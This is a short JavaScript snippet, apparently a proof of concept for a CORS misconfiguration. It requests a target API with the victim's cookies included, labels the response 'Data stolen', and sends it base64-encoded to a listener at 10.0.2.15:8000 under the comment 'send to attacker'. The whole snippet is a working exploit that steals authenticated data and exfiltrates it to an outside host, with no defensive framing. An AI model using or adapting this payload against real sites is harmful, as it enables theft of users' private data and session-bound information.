fetch("https://api.company-target.com/vulnerable", {
  credentials: "include" // for CORS with cookies
})
  .then(response => {
    const contentType = response.headers.get("content-type") || "";
    if (contentType.includes("application/json")) {
      return response.json();
    }
    return response.text(); // fallback for HTML or plain text
  })
  .then(data => {
    console.log("Data stolen:", data);
    // send to attacker
   fetch("http://10.0.2.15:8000/log?data=" + btoa(JSON.stringify(data)));
  })
  .catch(err => console.error("Fetch failed:", err));
